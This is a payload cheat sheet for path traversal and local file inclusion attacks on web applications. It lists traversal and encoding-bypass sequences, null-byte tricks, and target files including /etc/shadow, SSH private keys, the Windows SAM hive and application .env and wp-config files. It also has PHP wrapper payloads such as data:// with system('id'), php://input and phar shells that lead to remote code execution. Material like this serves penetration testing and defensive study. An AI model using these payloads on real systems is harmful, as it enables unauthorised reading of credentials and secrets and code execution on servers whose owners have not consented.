---
id: "lfi-path-traversal-payloads"
title: "Path Traversal & LFI Payloads"
type: "payload"
category: "web-application"
subcategory: "file-inclusion"
tags: ["lfi", "path-traversal", "directory-traversal", "file-read", "rfi", "null-byte"]
platforms: ["linux", "macos", "windows"]
related: ["path-traversal", "encoding-bypass-reference", "log-injection"]
difficulty: "intermediate"
updated: "2026-04-14"
---

# Path Traversal & LFI Payloads

## Basic Traversal Sequences
```
../
..\
..\/
/..
\..
....//
....\\
..;/              # Tomcat path parameter
..%00/            # Null byte (PHP < 5.3.4)
```

## Encoding Variants
```
%2e%2e%2f         # URL encoded ../
%2e%2e/           # Partial encode
..%2f             # Partial encode
%2e%2e%5c         # URL encoded ..\
%252e%252e%252f   # Double URL encoded
..%c0%af          # Overlong UTF-8 /
%c0%ae%c0%ae%c0%af # Overlong UTF-8 ../
..%ef%bc%8f       # Fullwidth /
..%e0%80%af       # Overlong UTF-8
..%25c0%25af      # Double encoded overlong
..%255c           # Double encoded \
```

## Interesting Files — Linux
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/proc/self/environ
/proc/self/cmdline
/proc/self/status
/proc/self/fd/0
/proc/self/cwd/
/proc/version
/proc/net/tcp
/home/USER/.bash_history
/home/USER/.ssh/id_rsa
/home/USER/.ssh/authorized_keys
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/auth.log
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/crontab
/root/.bash_history
/root/.ssh/id_rsa
```

## Interesting Files — Windows
```
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\win.ini
C:\Windows\system.ini
C:\inetpub\wwwroot\web.config
C:\Users\Administrator\.ssh\id_rsa
C:\Windows\repair\SAM
C:\Windows\debug\NetSetup.log
C:\Windows\System32\drivers\etc\hosts
```

## Interesting Files — Application
```
/var/www/html/.env
/var/www/html/config.php
/var/www/html/wp-config.php
/app/.env
/app/config/database.yml
/app/config/secrets.yml
/.git/config
/.git/HEAD
/.svn/entries
/WEB-INF/web.xml
```

## Null Byte Bypass (PHP < 5.3.4)
```
../../etc/passwd%00
../../etc/passwd%00.jpg
../../etc/passwd%00.php
../../etc/passwd\0
```

## Wrapper / Protocol Payloads (PHP)
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://input                    # POST body as file content (RCE)
data://text/plain,<?php system('id')?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpPz4=
expect://id                    # If expect:// wrapper enabled
zip://uploads/evil.zip%23shell.php
phar://uploads/evil.phar/shell.php
```

## Filter Bypass Patterns
```
....//....//etc/passwd         # Double traversal
..../..../etc/passwd
/var/www/../../etc/passwd      # Absolute + traversal
/etc/passwd                    # Direct absolute (if no prefix)
file:///etc/passwd             # File protocol
```
